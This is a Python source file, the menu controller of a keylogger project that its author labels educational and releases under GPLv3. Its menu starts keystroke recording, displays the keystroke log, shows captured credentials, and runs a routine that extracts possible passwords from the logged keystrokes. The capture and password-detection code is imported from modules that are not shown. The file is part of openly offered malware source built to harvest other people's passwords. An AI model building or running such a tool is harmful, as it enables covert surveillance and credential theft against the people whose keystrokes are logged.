# This script is a keylogger for educational purposes only.
# Author: @juanmafe.
# GPLv3 2022.

from pick import pick
from OpenFile import OpenFile
from Properties import Properties
from ProcessingKey import ProcessingKey
from DetectPassword import DetectPassword

class Menu(object):

	def create_menu():
		title = Properties.menu_title
		options = [Properties.menu_record_key, Properties.menu_read_log, Properties.menu_read_credentials, Properties.menu_regenerate_and_read_credentials, Properties.menu_exit]
		return pick(options, title, Properties.menu_indicator)


	def select_option():

		index = Menu.create_menu()

		if (0 == index[1]):
			ProcessingKey.record_key()
			Menu.select_option()

		if (1 == index[1]):
			OpenFile.open_keylog()
			ProcessingKey.wait_back_key()
			Menu.select_option()

		if (2 == index[1]):
			OpenFile.open_credentials()
			ProcessingKey.wait_back_key()
			Menu.select_option()

		if (3 == index[1]):
			DetectPassword.detect_and_obtain_possible_passwords()
			OpenFile.open_credentials()
			ProcessingKey.wait_back_key()
			Menu.select_option()

		if (4 == index[1]):
			print(Properties.enter + Properties.msg_bye)

#EOF